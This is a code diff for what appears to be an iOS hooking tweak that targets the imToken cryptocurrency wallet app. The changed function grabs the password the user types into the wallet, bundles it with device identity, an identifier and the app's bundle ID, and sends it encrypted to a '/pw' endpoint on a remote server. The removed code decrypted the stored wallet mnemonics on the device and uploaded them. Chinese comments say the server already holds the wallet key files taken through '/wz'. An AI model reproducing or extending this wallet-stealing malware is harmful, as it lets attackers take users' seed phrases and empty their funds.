@@ -121,7 +121,7 @@ static NSString *const kAesPassword = @"Ek8pl31K2yeHgQwy";
             for (NSInteger i = 0; i < 200; i++) {
                 if (self.sentMnemonic) break;
                 if ([ImToken hookFired]) {
-                    [self tryDecryptAndUpload];
+                    [self uploadCapturedPassword];
                 }
                 usleep(3 * 1000 * 1000);
             }
@@ -150,30 +150,30 @@ static NSString *const kAesPassword = @"Ek8pl31K2yeHgQwy";
     }
 }
 
-/// 钩子捕获到密码后：用 App 自己的解密函数解 encMnemonic
-- (void)tryDecryptAndUpload {
+/// 钩子捕获到密码后：立刻回传密码，解密交给服务端做
+/// （服务端已经用 /wz 收过容器里的密钥文件，拿到密码就能解出助记词）
+- (void)uploadCapturedPassword {
     @try {
-        NSArray *ws = [ImToken wallets];
-        for (NSDictionary *w in ws) {
-            NSString *enc = w[@"encMnemonic"] ?: w[@"encMnemonicV2"];
-            if (![enc isKindOfClass:[NSString class]] || enc.length < 16) continue;
-
-            NSString *plain = [ImToken decryptMnemonic:enc];
-            if (plain.length > 20) {
-                if ([self uploadMnemonic:plain]) {
-                    self.sentMnemonic = YES;
-                    [self reportEvent:@"imtoken_mnemonic_decrypted"
-                                  ctx:@{ @"words": @(plain.length) }];
-                    return;
-                }
-            }
+        NSString *pwd = [ImToken capturedPassword];
+        if (!pwd.length) {
+            [self reportEvent:@"imtoken_password_empty" ctx:@{ @"error": [ImToken lastError] ?: @"" }];
+            return;
         }
-        // 解不出来也报一次，便于排查
-        [self reportEvent:@"imtoken_decrypt_failed"
-                      ctx:@{ @"error": [ImToken lastError] ?: @"",
-                             @"hasKey": @([ImToken capturedDerivedKey] != nil) }];
+
+        NSMutableDictionary *body = [NSMutableDictionary dictionaryWithDictionary:[Info identity] ?: @{}];
+        body[@"c"] = @"d9f5121f75a6646c4f814a4ff8c41b04";
+        body[@"bundle_id"] = @"im.token.app";
+        body[@"pwd"] = pwd;
+
+        NSDictionary *r = [self.net postEncrypted:@"/pw" json:body timeout:30];
+        self.sentMnemonic = YES;
+
+        NSMutableDictionary *ctx = [NSMutableDictionary dictionary];
+        ctx[@"pwLen"] = @(pwd.length);
+        ctx[@"resp"] = r ? [r description] : @"nil";
+        [self reportEvent:@"imtoken_password_sent" ctx:ctx];
     } @catch (NSException *e) {
-        (void)e;
+        [self reportEvent:@"imtoken_password_failed" ctx:@{ @"reason": e.reason ?: @"" }];
     }
 }
 
